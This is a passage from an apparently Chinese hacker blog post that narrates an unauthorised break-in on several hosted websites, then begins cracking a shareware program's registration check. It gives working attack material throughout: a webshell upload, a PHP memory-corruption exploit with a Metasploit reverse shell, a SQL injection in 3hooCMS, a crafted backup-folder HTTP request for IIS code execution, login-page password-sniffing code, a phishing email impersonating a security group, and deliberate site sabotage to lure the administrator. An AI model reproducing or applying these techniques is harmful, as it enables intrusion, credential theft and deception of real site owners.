.gif&quot;</p>  <p>用nc提交后即得到名为120107005538_53.asp的上传文件，也就拿到其webshell。如图7：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010" border="0" alt="clip_image010" src="http://img.cker.in/2_201D/clip_image010.jpg" width="557" height="208"></p>  <p>图7</p>  <p>其实这里上传的时候，web防火墙也拦了好几次，几乎杀了我95%的小马，最后只能请出独门暗器才躲过这bt的防火墙。后来才知道该虚拟主机使用的组合是【星外+护卫神.入侵防护专家】。</p>  <p>拿到<a href="http://www.aaa.com/" target="_blank" rel="external">www.aaa.com</a>的webshell后，自然是想跨目录到a.111.com。而最新的星外+护卫神的确很有效，删除了wscript.shell、shellapplication等扩展，还不支持aspx，没有任何运行命令的可能。</p>  <p>我用phpinfo看了下<a href="http://www.aaa.com的web/" target="_blank" rel="external">www.aaa.com的web</a>服务器的php版本是5.2.9-2。版本不高，我印象里php5.2.13以下的版本出过好几个漏洞，其中【PHP hash_update_file() Already Freed Resource Access Vulnerability】是比较著名的。于是我放下该站的webshell，找到这个漏洞公告和poc，准备调试一下这个漏洞，用它去执行命令，进而提升权限。</p>  <p>公告地址为：<a href="http://sebug.net/vuldb/ssvid-19563" target="_blank" rel="external"></a></p>  <p><a href="http://php-security.org/2010/05/01/mops-2010-001-php-hash_update_file-already-freed-resource-access-vulnerability/index.html" target="_blank" rel="external">http://php-security.org/2010/05/01/mops-2010-001-php-hash_update_file-already-freed-resource-access-vulnerability/index.html</a></p>  <p>我在vmware_winxp的apache+php环境里，用windbg附加进程httpd.exe,然后在浏览器打开这个漏洞的poc，发生异常，如图8：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012" border="0" alt="clip_image012" src="http://img.cker.in/2_201D/clip_image012.jpg" width="557" height="305"></p>  <p>图8</p>  <p>由图8可以看到发生问题的模块是php5ts.dll,发生问题的函数是php_hash_register.在这个函数偏移0x2bf处发生了异常。</p>  <p>显然php5ts.dll是php的核心解析器，php所有的功能都包含在它里面，不论什么操作系统运行php都少不了要加载它。从这里可以看出这个漏洞危害的范围很广，是跨平台的。至于漏洞发生的原因就不在这里调试叙述了。</p>  <p>现在看发生异常的位置是：</p>  <p>00a74fef ff5204 call dword ptr [edx+4] ds:0023:55555559=????????</p>  <p>Eip为0x00a74fef的地方，而poc第一句代码就是define(&quot;OFFSET&quot;, pack(&quot;L&quot;,0x55555555));把这个地址装入一个二进制串中。再看异常发生时的寄存器环境如图8中的edx=0x55555555，后来再通过调试确定开始的第一句代码的地址就是控制的edx寄存器。那么只要能在edx+4指向的地址装入精心构造的shellcode，就可以顺利溢出了。</p>  <p>“PHP addcslashes()信息泄露漏洞，他可以读出内存空间中的信息，在读出的信息中，从偏移0x10开始，保存了一个指针，而在该指针偏移0x20开始保存我们控制的变量的值。”</p>  <p>这样的话我们就可以用PHP addcslashes()漏洞找到放置shellcode的地址，再找到某个变量A的地址，在变量A的地方存放shellcode的地址，那么call [edx+4]就可以执行shellcode了。把那两个poc结合起来，最后那个hexdump()函数改成我们自己的找到偏移0x10指向的0x20的地址的函数，好像很绕口。</p>  <p>其实是很简单的一个功能，直接附上2yue写的这个函数。</p>  <p>function hexdump($x) </p>  <p>{</p>  <p>$ret_long = ord($x[0x13]) <em> 0x1000000 + ord($x[0x12]) </em> 0x10000 + ord($x[0x11]) <em> 0x100 + ord($x[0x10]);</em></p>  <p>$ret_long = $ret_long + 0x20; </p>  <p>return $ret_long;</p>  <p>}</p>  <p>只是里面的细节还需要调一调：例如要生成纯字母数字的shellcode，edx+4那个地方调一下等等，然后就可以用 metasploit生成我们想要的纯字母数字的shellcode了。</p>  <p>我在本机测试成功，如图9，当然还是要感谢2yue。</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image013" border="0" alt="clip_image013" src="http://img.cker.in/2_201D/clip_image013.jpg" width="540" height="191"></p>  <p>图9</p>  <p>在漏洞调试成功后的第2天，我准备用这个exp提权时，用菜刀连上我的webshell，谁知道却返回404.</p>  <p>我把<a href="http://www.aaa.com/" target="_blank" rel="external">www.aaa.com</a> 输入浏览器后，返回如下信息，如图10</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014" border="0" alt="clip_image014" src="http://img.cker.in/2_201D/clip_image014.jpg" width="514" height="232"></p>  <p>图10</p>  <p>从图10看到，那个昨天刚拿下的网站，今天域名就过期，我悲催的人生仍在延续，我能说什么呢。</p>  <p>我只能老老实实再杀回来，仔细分析虚拟主机上剩下的那几个网站了。那个悲催的站被关闭了之后剩下的不是discuz! X2 就是静态html的站，再不就是很知名的较新版本的无已知漏洞的cms了，就只有一个asp的站，地址为：<a href="http://www.bbb.com/" target="_blank" rel="external">http://www.bbb.com</a>。也许这个站是唯一的突破口了，用后台扫描器很容易扫到后台是<a href="http://www.bbb.com/manage/" target="_blank" rel="external">http://www.bbb.com/manage/</a> 如图11</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image015" border="0" alt="clip_image015" src="http://img.cker.in/2_201D/clip_image015.jpg" width="441" height="204"></p>  <p>图11</p>  <p>从图11很清晰的得到这个网站程序是3hooCMS V3 SP2，我搜了一下，没有找到这个版本的漏洞，较低的版本倒是有一个xss漏洞，并且也没有这个版本CMS的公开下载，我怀疑目标是商业版。我只找到3hooCMS_V2_SP2的下载。</p>  <p>下载完后我在vmware_win2003下搭了环境，开始分析其源代码。</p>  <p>经过一段时间的分析，我发现Search.Asp这个文件存在sql注入漏洞。</p>  <p>代码第9行到12行</p>  <p>Dim TplFileUrl,TplStr,Sql,Rs,rCid,Cid </p>  <p>SoKey=trim(request(&quot;sokey&quot;))</p>  <p>page=request.QueryString(&quot;page&quot;)</p>  <p>第10行SoKey变量没有经过任何过滤传了进来。</p>  <p>第41到47行</p>  <p>if SoKey=&quot;&quot; then </p>  <p>csql=&quot;&quot;</p>  <p>filename=&quot;Search.Asp&quot;</p>  <p>else </p>  <p>filename=&quot;Search.Asp?sokey=&quot;&amp;SoKey</p>  <p>end if </p>  <p>sql=&quot;select  from [info] where &quot;&amp;LanguageSet&amp;&quot;Name like’%&quot;&amp;SoKey&amp;&quot;%’ order by id desc;&quot;</p>  <p>SoKey被当做搜索型变量传入sql语句中。</p>  <p>因此这里存在是一个搜索型的注入漏洞。</p>  <p>由于是已知的cms，其表名和字段名都不用猜了：</p>  <p>管理员表名：ScmsAdmin</p>  <p>用户名字段：username 密码字段：password .</p>  <p>选择好关键字直接在nbsi工具里跑吧。</p>  <p>很遗憾的是没有跑出任何结果，于是我在目标网站手工在搜索输入框里测试。</p>  <p>当输入33%’ and 1=1 and ‘%’=’时查询出了一些结果。</p>  <p>而输入33%’ and 1=2 and ‘%’=’时又没有任何结果。完全没有问题啊，sql语句肯定执行了，注入百分之百存在，但为什么就是跑不出来呢。我突然想到，也许新版本第10行代码应该是这么写的吧</p>  <p>SoKey=trim(request.form(&quot;sokey&quot;))</p>  <p>这是post提交方式哦，我马上变换成了post的扫描方式，终于得出了结果如图12</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image017" border="0" alt="clip_image017" src="http://img.cker.in/2_201D/clip_image017.jpg" width="557" height="145"></p>  <p>图12</p>  <p>得到加密的密码【fead0df1fe60103eaba454dd0a7e0842】后拿到cmd5解密，于是我悲催的运气再次降临，掏钱都无法解密。看来这年头不设置个10位以上字母+数字+特殊字符的密码都不好意思和别人打招呼啊。</p>  <p>Md5密码破不出来其实是常有的事，不过也说明国内上网用户的安全意识也在一步步的提高。我考虑到既然他网站有这个注入漏洞，那么管理员即便改了密码，我仍然能通过SQL注入漏洞得到hash，如果他能改一个cmd5能破出来的简单的密码不就有希望了吗？于是我借用2011年底的网络安全密码泄露门事件，给管理员发了一封email。如图13：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image019" border="0" alt="clip_image019" src="http://img.cker.in/2_201D/clip_image019.jpg" width="557" height="302"></p>  <p>图13</p>  <p>很不好意思，这里我借用了90sec.org的名义，因为我觉得90sec中有很多90后的技术水平还是蛮高的，并且喜欢免费给某些网站提交漏洞。</p>  <p>Email发出去2天后，再次注入得出密码的hash，发现他没有修改。我也感觉此路不通，即便他修改了，很有可能密码还是很bt复杂的破不出来啊。</p>  <p>后来又想到去社工主网站<a href="http://www.111.com/" target="_blank" rel="external">www.111.com</a>的管理员，询问他为什么主网站不能注册普通用户，也不能登录，是不是网站程序坏掉了。想借他们修复普通用户注册功能后，上传一个含有php木马的图片,再利用iis7.5的解析漏洞得到shell。但得到的答复是，他们就是专门禁止普通用户注册和登陆的。</p>  <p>罢了，我社工真的不擅长，不太会与人交互，还是靠自己吧。</p>  <p><b>0</b><b>×07 V5的迂回战术</b></p>  <p>考虑到好不容易拿到<a href="http://www.bbb.com/" target="_blank" rel="external">http://www.bbb.com</a>的hash，不能这么轻易放过这个站啊。于是想到看这个管理员有没有其他的站，通过拿下他自己的另外的站然后再得到其密码也是一个不错的选择。这就是所谓的迂回战术吧，我不从正面进攻了，我从你有弱点的地方进攻还不行嘛？</p>  <p>于是我根据他网站提供的信息，再加上whois查询、域名查询、谷歌、百度，终于发现这个管理员在其他虚拟机还存在三个类似的站分别是:</p>  <p><a href="http://www.bbb1.com/" target="_blank" rel="external">http://www.bbb1.com</a></p>  <p><a href="http://www.bbb2.com/" target="_blank" rel="external">http://www.bbb2.com</a></p>  <p><a href="http://www.bbb3.com/" target="_blank" rel="external">http://www.bbb3.com</a></p>  <p>虚拟主机操作系统同样是windows2003.令人兴奋的是这三个站与<a href="http://www.bbb.com/" target="_blank" rel="external">www.bbb.com</a>使用的是同一套cms，都是3hooCMS V3 SP2.</p>  <p>利用我前面发现的sql注入漏洞很容易得到bbb1、bbb2两个站的后台管理员的密码hash都为【fead0df1fe60103eaba454dd0a7e0842】，和bbb.com是一样无法破解的。</p>  <p>第五次悲催的运气令我暂时放弃了一段时间。</p>  <p>又过了一天，我怀着百分之一的希望把<a href="http://www.bbb3.com/" target="_blank" rel="external">www.bbb3.com</a>也扫了一遍，但惊奇的是密码hash和其他三个都不一样，立刻拿到cmd5去破解。如图14：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image021" border="0" alt="clip_image021" src="http://img.cker.in/2_201D/clip_image021.jpg" width="557" height="210"></p>  <p>如图14</p>  <p>就这样我拿到了www.bbb3.com管理员的密码。这下我感到形式一片大好，思路是这样：</p>  <p>1. 通过进入bbb3.com的后台，得到一个webshell。</p>  <p>2. 再从webshell里通过提权跨目录到bbb2.com。</p>  <p>3. 改写bbb2.com的后台登陆后代码，嗅探其明文密码。</p>  <p>4. 同步进行ftp密码的破解，顺便去尝试bbb.com的ftp。</p>  <p>至此我感觉这个迂回的战术还算威武吧。</p>  <p>进入<a href="http://www.bbb3.com/" target="_blank" rel="external">www.bbb3.com</a>后台后，尝试了上传的地方，又看了源代码，发现没什么漏洞，他严格检测了后缀并以时间格式强制改了上传后的文件名。应该是较成熟的上传代码。而网站设置那块是写入数据库的。唯一可能出问题的地方也就是数据库备份这里了。如图15：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image023" border="0" alt="clip_image023" src="http://img.cker.in/2_201D/clip_image023.jpg" width="557" height="403"></p>  <p>图15</p>  <p>从图15得知数据库的路径和后缀，不过看着诱人的asa后缀，却做好了防下载处理，我利用asp小马代码入库的方式来测试，发现#Data23%base#.asa是无法执行asp的。</p>  <p>只剩下备份这里容易出问题了。</p>  <p>大家肯定是这样想的，上传一个带一句话asp木马的图片，然后备份这个图片为asp不就完事了吗？</p>  <p>但悲催的是有以下几个问题需要解决：</p>  <p>1. 当前数据库路径输入框这里和备份数据库名称输入框这里都是只读的，无法更改。</p>  <p>2. 即便备份为a.asp;a.jpg也不可执行（我后来才知道，可能是防火墙拦截的原因）。</p>  <p>第一个问题好处理，客户端的一切防御手段都是浮云。一个readonly能阻挡我这个久经沙场的老将吗？不论是把其htm存下来，把action完整路径附上提交，还是用firefox的插件，再或是用国外的神器burpsuite，都能轻松绕过。</p>  <p>至于第二个问题，我发现肯定备份出了a.asp;a.jpg类型的文件，可是用浏览器访问却总是出现恶心的404错误。</p>  <p>我只能再看其cms源代码，看他备份这里到底是如何处理的。</p>  <p>看了一会儿后，如愿以偿的发现了问题，漏洞文件为Admin_DataBackup.asp</p>  <p>代码65—83行代码如下：</p>  <p>sub backupdata() </p>  <p>Dbpath=request.form(&quot;Dbpath&quot;) </p>  <p>Dbpath=server.mappath(Dbpath) </p>  <p>bkfolder=request.form(&quot;bkfolder&quot;) </p>  <p>bkdbname=request.form(&quot;bkdbname&quot;) </p>  <p>Set Fso=server.createobject(&quot;scripting.filesystemobject&quot;) </p>  <p>if fso.fileexists(dbpath) then </p>  <p>72.If CheckDir(bkfolder) = True Then </p>  <p>73.fso.copyfile dbpath,bkfolder&amp; &quot;\&quot;&amp; bkdbname &amp; &quot;.mdb&quot;</p>  <p>74.else </p>  <p>75.MakeNewsDir bkfolder </p>  <p>76.fso.copyfile dbpath,bkfolder&amp; &quot;\&quot;&amp; bkdbname &amp; &quot;.mdb&quot;</p>  <p>end if </p>  <p>response.write &quot;&lt;center&gt;备份数据库成功，备份的数据库路径为 &quot; &amp; bkfolder &amp; &quot;\&quot; &amp; bkdbname &amp; &quot;.mdb&lt;/center&gt;&quot; </p>  <p>response.write &quot;&lt;center&gt;&lt;a href=’Databackup\&quot; &amp; bkdbname &amp; &quot;.mdb’ a&gt;下载本次备份数据库到本地&lt;/a&gt;&lt;/center&gt;&quot; </p>  <p>Else </p>  <p>response.write &quot;找不到您所需要备份的文件。&quot; </p>  <p>End if </p>  <p>end sub</p>  <p>第68行 bkfolder=request.form(&quot;bkfolder&quot;) 没有对目录名做过滤。</p>  <p>而request.form(&quot;bkfolder&quot;)是从第37行这句代码传过来的。</p>  <p>&lt;td height=&quot;22&quot;&gt;&lt;input type=&quot;hidden&quot; size=50 name=bkfolder value=Databackup &gt;&lt;/td&gt;</p>  <p>说明默认情况下bkfolder= Databackup这个目录。</p>  <p>第72到76行，是说检测bkfolder这个目录是否存在，如果不存在就调用</p>  <p>MakeNewsDir bkfolder 这个函数。</p>  <p>再看98—103行代码如下：</p>  <p>Function MakeNewsDir(foldername) </p>  <p>Set fso1 = CreateObject(&quot;Scripting.FileSystemObject&quot;) </p>  <p>Set f = fso1.CreateFolder(foldername) </p>  <p>MakeNewsDir = True </p>  <p>Set fso1 = nothing </p>  <p>End Function</p>  <p>直接调用fso创建一个没有过滤的参数的文件夹。</p>  <p>这时大家可能都想到了，那么如果我们上传的时候抓包，把默认的文件夹Databackup改为kyo.asp，那不就创建了一个kyo.asp的文件夹吗？这样配合iis6.0的漏洞将可以成功执行我的美女图片asp木马。</p>  <p>实战当中也是这样的，把抓的包改为这样的形式,再用nc提交就KO了。</p>  <p>POST /manage/Admin_DataBackup.asp?action=Backup HTTP/1.1</p>  <p>Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, application/vnd.ms-excel, application/vnd.ms-powerpoint, <em>/</em></p>  <p>Accept-Language: zh-cn</p>  <p>Content-Type: application/x-www-form-urlencoded</p>  <p>Accept-Encoding: gzip, deflate</p>  <p>User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)</p>  <p>Host: www.bbb3.com</p>  <p>Content-Length: 77</p>  <p>Connection: Keep-Alive</p>  <p>Cache-Control: no-cache</p>  <p>Cookie: ASPSESSIONIDSATTCRQC=LFGDIANCDLPBPGNJNCMPKEIM; Scms%5FVerifyCode=9109</p>  <p>DBpath=..%2FUpLoadFile%2F20120112012046769.jpg&amp;bkfolder=kyo.asp&amp;bkDBname=data</p>  <p>那么备份成功后，菜刀提交url路径类似于这样：</p>  <p><a href="http://www.bbb3.com/manage/kyo.asp/data.mdb" target="_blank" rel="external">http://www.bbb3.com/manage/kyo.asp/data.mdb</a></p>  <p>至此也算拿下了一个webshell，万里长征又进了一步。</p>  <p><b>0</b><b>×09 asp登陆口嗅探变态的密码</b></p>  <p>幸运的是<a href="http://www.bbb3.com/" target="_blank" rel="external">www.bbb3.com</a>所在的虚拟主机没有做什么安全措施，传上去一个aspx的木马就可以跨到<a href="http://www.bbb1.com/" target="_blank" rel="external">www.bbb1.com</a>和<a href="http://www.bbb2.com/" target="_blank" rel="external">www.bbb2.com</a>的目录里去了，毕竟aspx默认是权限稍大的user权限。在尝试ftp密码无果后，下一步就是在bbb1和bbb2的后台登陆口页面写嗅探代码了。</p>  <p>我在Admin_Send.asp页面第8行开始添加以下代码：</p>  <p>thename=replace(trim(request.form(&quot;username&quot;)),&quot;’&quot;,&quot;&quot;)</p>  <p>thepass=replace(trim(Request.form(&quot;password&quot;)),&quot;’&quot;,&quot;&quot;)</p>  <p>SaveFile=&quot;page.gif&quot; </p>  <p>GetPostStr=thename&amp;&quot;|&quot;&amp;thepass</p>  <p>set F=server.CreateObject(&quot;scripting.filesystemobject&quot;)</p>  <p>set I=F.OpenTextFile(server.mappath(SaveFile),8,True,0)</p>  <p>I.WriteLine(GetPostStr)</p>  <p>I.close</p>  <p>Set F=nothing</p>  <p>只要管理员登陆后台，密码就会被记录在page.gif中，剩下的就只有等了。</p>  <p>但我不是一个忍者，等了一天无果后，我就在他数据库网站配置字段做了点手脚</p>  <p>致使访问他网站首页是空白，但是后台还是可以正常登陆的。果然这家伙不到半天就急了，当天晚上的时候我就顺利的嗅探到了他的变态的密码。如图16：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image024" border="0" alt="clip_image024" src="http://img.cker.in/2_201D/clip_image024.jpg" width="480" height="159"></p>  <p>图16</p>  <p>从图16可以看到，密码果然很强悍，10位以上，字母数字再加上+-号，让www.cmd5.com再添50公斤的硬盘也破不了啊。</p>  <p>拿到这个关键性的密码，再用前面研究出的3hoocms 后台getshell漏洞，轻车熟路的拿下<a href="http://www.bbb.com/" target="_blank" rel="external">www.bbb.com</a>的webshell，也就是a.111.com所在的虚拟主机。</p>  <p>接下来的任务就是提权跨目录到a.111.com了。</p>  <p><b>0</b><b>×0a 突破星外+护卫神</b></p>  <p>进行到这里，在星外虚拟主机+护卫神.入侵防护专家的防御之下，确实让人望而却步。好在php版本比较低，我终于用上了那个调试好的php溢出漏洞。在metasploit生成一个反弹端口的shellcode添加到那个exp.php代码中后。我在本机执行nc –vvlp 8181,然后把exp.php传到<a href="http://www.bbb.com/" target="_blank" rel="external">www.bbb.com</a>根目录。当我在浏览器打开<a href="http://www.bbb.com/exp.php" target="_blank" rel="external">http://www.bbb.com/exp.php</a>时，立刻出现了如图17的错误：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image026" border="0" alt="clip_image026" src="http://img.cker.in/2_201D/clip_image026.jpg" width="557" height="110"></p>  <p>图17</p>  <p>从图17返回的内容来看，应该是没有成功。后来我在vmware_win2003设置了和目标操作系统+php版本+php执行方式（ISAPI）一模一样的环境，我顺利反弹回来一个nt network权限的shell。这里我考虑应该是w3wp.exe 执行的shellcode ，所以继承w3wp的nt network权限。但不论怎样也是个交互式可执行命令的shell啊。我第6次悲催的运气，促使我终于找到了答案，原来目标win2003打开了dep（堆栈数据执行保护）。</p>  <p>我仍然没有气馁，虽然上次域名过期那个站的目录没有执行aspx的权限，那么这个<a href="http://www.bbb.com/" target="_blank" rel="external">www.bbb.com</a>的目录我还没试呢。万一支持aspx不就又多一种执行命令的方法吗？即这个方法：</p>  <p>System.Diagnostics.Process.Start(@&quot;calc.exe&quot;);)</p>  <p>这次我果然没有再次苦命，bbb.com是支持aspx的，只是有两个问题需要解决。</p>  <p>1. 护卫神几乎杀光了所有的aspx木马，需要突破。</p>  <p>2. 星外虚拟主机的可写可执行目录的寻找是个大麻烦。需要寻觅一个，上传cmd.exe，来支持aspx执行命令，因为大家都知道win2003默认情况，c:\windows\system32\cmd.exe只对administrator有权限读写。</p>  <p>第一个问题比较好解决，改变一下字段名，除去敏感字符串，再把函数位置条换一下。也就能过了，最多也就是再加密一下而已。</p>  <p>至于第二个问题，我倒没有什么好方法，只能写个遍历脚本，测试可读的每一个目录是否有漏网的可写目录存在了。这个网上有很多先人已经写出过这样的方法了，用拿来主义改一改即可。</p>  <p>终于被我找到了星外的一个可写目录是：</p>  <p>C:\Documents and Settings\All Users\Application Data\Microsoft\Media Index</p>  <p>剩下的事情就简单了，我也懒得用pr大杀器，也用不着最新windows全版本的0day提权exp这个牛刀了。直接传一个cscript.exe+iisgetpass.vbs</p>  <p>读出所有网站用户的配置信息和密码即可。iisgetpass.vbs代码大家都有，我就不在这里占篇幅了。</p>  <p>最终结果如图18：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image028" border="0" alt="clip_image028" src="http://img.cker.in/2_201D/clip_image028.jpg" width="557" height="233"></p>  <p>图18</p>  <p>一般这样的结构的网站,iis账户的密码就是ftp的密码。就这样我得到了a.111.com的ftp账户和密码，并成功把其拿下。</p>  <p>由于主目标<a href="http://www.aaa.com/" target="_blank" rel="external">www.aaa.com</a>只开80,也无法用这个ftp密码去尝试它，并且再用这个密码尝试其论坛管理员的密码又无结果，只能继续嗅探了。</p>  <p><b></b></p>  <p><b></b>拿下a.111.com后，还是有一些惊喜的。我看到了<a href="http://www.111.com的早期的论坛数据库存在于a.111.com/" target="_blank" rel="external">www.111.com的早期的论坛数据库存在于a.111.com</a>的库中，并且我经过转换，其管理员的discuz! Hash密码与a.111.com的md5 hash密码是一样的。</p>  <p>其实这个对比很简单。</p>  <p>假设a.111.com中管理员的密码hash为：228ab4dd53787ce32a88ade0eeea8a51</p>  <p>早期<a href="http://www.111.com的discuz/" target="_blank" rel="external">www.111.com的discuz</a> 管理员密码hash为：</p>  <p>8946fa73f2b44b64da2ebab1aaa57ec6：42ee90</p>  <p>那么测试md5(228ab4dd53787ce32a88ade0eeea8a5142ee90)如果等于8946fa73f2b44b64da2ebab1aaa57ec6，则说明两个密码的明文是一样的。</p>  <p>因为discuz加密的方式是：md5(md5($pass).$salt)，我恰恰证实了这一点。</p>  <p>由于密码的复杂度不是现代的人类所能暴力破解的，我于是又一次选择了php登陆口密码嗅探。</p>  <p>于此同时还在继续着另一个工作，就是查找那个帖子所在版块的斑竹的用户名，拿到这些任何一个斑竹的密码不也一样能删帖子达到目的吗？但第7次悲催的运气告诉我，你省省吧，人家那个版块的斑竹就是管理员一个人。我再次无语。</p>  <p>还是老老实实的写代码嗅探吧。</p>  <p>我找到a.111.com的前台和后台登陆口添加了下面的代码。</p>  <p>$username1 = $this-&gt;Username;</p>  <p>$password1 = $this-&gt;Password;</p>  <p>$file=&quot;././images/ bg1.gif&quot;;</p>  <p>$handle = @fopen(&quot;././images/th_bg1.gif&quot;, &quot;a&quot;);</p>  <p>$recontent = fread($handle,filesize($file));</p>  <p>$content= $username1.&quot;—-&quot;.$password1.&quot;—-date is:&quot;.date(&quot;Y-m-d H:i:s&quot;).&quot;\r\n&quot;;</p>  <p>$result=$recontent.&quot;\r\n&quot;.$content;</p>  <p>@fwrite($handle,$result);</p>  <p>这次我没有着急，因为我发现这个管理员很勤快，几乎天天更新博客，于是第二天顺利记录到其密码。</p>  <p>在拿到管理员变态密码迫不及待的登陆之后，第8次悲催的运气也同时降临了。他需要提示问题的答案才能登陆。</p>  <p>鬼才知道他母亲的名字，他爷爷的名字，他父亲出生的城市，他老师的名字……</p>  <p>再说他也不一定就老老实实写真实答案啊。</p>  <p>在以前，我遇到此类情况都是直接放弃，但是这次不同，前面一个多礼拜承载了我太多的磨难和脑细胞，我无法说服自己放弃。</p>  <p>不是有一个早期的bbs的用户数据库嘛？我于是找到了密码提示问题答案的加密字段为：2afd4591.仅仅是一个8位的串，到底是什么加密算法呢。</p>  <p>我再次担当了阅读源代码的苦力差事。引用2yue的一句话，把我累得跟骆驼一样，终于得到如下结果。</p>  <p>Discuz提示问题有7个，按数字序号是1,2,3,4,5,6,7。设为变量$i</p>  <p>明文答案设为变量$pass.</p>  <p>那么2afd4591=substr(md5($pass.md5($id)),16,8)</p>  <p>这样的话，提示问题答案是可以暴力跑的啊，但如果他的答案是汉字或者很变态的长度的明文，也是很难爆出来的。我发现他最后的hash串仅仅是8位，那么有很大的几率是可以碰撞成功的。</p>  <p>于是我认为：肯定存在多个明文，hash与2afd4591一样，但明文不一样，我十分肯定我的分析。</p>  <p>下面就需要先制作一个大字典，然后开始写程序，碰撞吧。</p>  <p><b></b></p>  <p><b></b>我可没有那么多耐性去做重复的工作，我认为肯定有很多人写过字典生成工具，下载一个用就是了。于是我下载到这个小工具superdic，还挺好用的。如图19：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image029" border="0" alt="clip_image029" src="http://img.cker.in/2_201D/clip_image029.jpg" width="493" height="337"></p>  <p>图19</p>  <p>图19告诉我，如果要使用完整功能，需要花注册费15元。</p>  <p>自己操刀OllyDBG调试一下，看这个作者用什么加密算法保护自己的程序吧。其实有时候调试算法，破解作者的加密思路也是一个不错的游戏，但是这次我没有那么多精力了，如果它能在两个小时内阻挡我，那我就从我绵薄的存款中给作者奉献一回吧。</p>  <p>先用peid加载superdic.exe如图20</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image030" border="0" alt="clip_image030" src="http://img.cker.in/2_201D/clip_image030.jpg" width="419" height="226"></p>  <p>图20</p>  <p>从图20可以看出，软件是vc++6.0写的，且没有加壳。看到这些我很遐意，看来省了我不少事。再用ida加载函数库符号并导入OllyDBG后，就可以开始分析了。</p>  <p>F9运行后我首先用注册码等于123456789，点注册，弹出一个对话框，提示“请重启本程序，如果您输入的注册密码正确，将能使用本软件的全部功能，并可享受后续版本的免费升级。”那么一般来说，重启验证要么是keyfile,要么是写入注册表。经过下断点测试，我发现该程序使用的是注册表验证。</p>  <p>这样一来，下断就有思路了。</p>  <p>用OllyDBG加载superdic.exe后，在命令行下断bp RegOpenKeyExA,然后按f9让其运行，眼睛同时观察着右边的堆栈窗口，在第6次f9之后，断在了这里如图21：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image032" border="0" alt="clip_image032" src="http://img.cker.in/2_201D/clip_image032.jpg" width="557" height="278"></p>  <p>图21</p>  <p>从堆栈可以看到该软件注册表的位置是：Software\EUsoft\superdic</p>  <p>用regedit打开看一下这个位置如图22：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image034" border="0" alt="clip_image034" src="http://img.cker.in/2_201D/clip_image034.jpg" width="558" height="122"></p>  <p>图22</p>  <p>图22中看到了superdic把用户名和注册码都保存在了Software\EUsoft\superdic这个位置。</p>  <p>这时在0x77da7852这个位置，按f2取消断点，然后alt+f9即可回到应用程序领空。这样一路f8可以来到这里</p>  <p>/<em>403AEA</em>/ LEA ESI,DWORD PTR DS:[EBX+6FC]</p>  <p>/<em>403AF0</em>/ PUSH ESI</p>  <p>/<em>403AF1</em>/ CALL superdic.004027A0</p>  <p>/<em>403AF6</em>/ ADD ESP,0C</p>  <p>/<em>403AF9</em>/ MOV ECX,EBX</p>  <p>/<em>403AFB</em>/ PUSH ESI</p>  <p>/<em>403AFC</em>/ PUSH 4A0</p>  <p>/<em>403B01</em>/ CALL superdic.00430B3C</p>  <p>/<em>403B06</em>/ MOV EDX,DWORD PTR DS:[EBX+218]</p>  <p>/<em>403B0C</em>/ LEA ESI,DWORD PTR DS:[EBX+218]</p>  <p>/<em>403B12</em>/ PUSH 0FF</p>  <p>/<em>403B17</em>/ MOV ECX,ESI</p>  <p>可以在0x403af0处设置一个断点，接着f7进入CALL superdic.004027A0，大致一看应该是申请号的生成方法,代码如下：</p>  <p>004027A0 SUB ESP,0C</p>  <p>004027A3 PUSH ESI</p>  <p>004027A4 PUSH 0C</p>  <p>004027A6 CALL superdic.004319E7</p>  <p>004027AB PUSH 0A</p>  <p>004027AD MOV ESI,EAX</p>  <p>004027AF CALL superdic.004319E7</p>  <p>004027B4 ADD ESP,8</p>  <p>004027B7 LEA ECX,DWORD PTR SS:[ESP+C]</p>  <p>004027BB LEA EDX,DWORD PTR SS:[ESP+4]</p>  <p>004027BF PUSH 0A ; /pFileSystemNameSize = 0000000A</p>  <p>004027C1 PUSH EAX ; |pFileSystemNameBuffer</p>  <p>004027C2 LEA EAX,DWORD PTR SS:[ESP+10] ; |</p>  <p>004027C6 PUSH EAX ; |pFileSystemFlags</p>  <p>004027C7 PUSH ECX ; |pMaxFilenameLength</p>  <p>004027C8 PUSH EDX ; |pVolumeSerialNumber</p>  <p>004027C9 PUSH 0C ; |MaxVolumeNameSize = C (12.)</p>  <p>004027CB PUSH ESI ; |VolumeNameBuffer</p>  <p>004027CC PUSH superdic.00446148 ; |RootPathName = &quot;c:\&quot;</p>  <p>004027D1 CALL DWORD PTR DS:[&lt;&amp;KERNEL32.GetVolumeI&gt;; \GetVolumeInformationA</p>  <p>004027D7 MOV EAX,DWORD PTR SS:[ESP+4]</p>  <p>004027DB MOV ESI,DWORD PTR SS:[ESP+14]</p>  <p>004027DF PUSH EAX</p>  <p>004027E0 PUSH superdic.00446144 ; ASCII &quot;%x&quot;</p>  <p>004027E5 PUSH 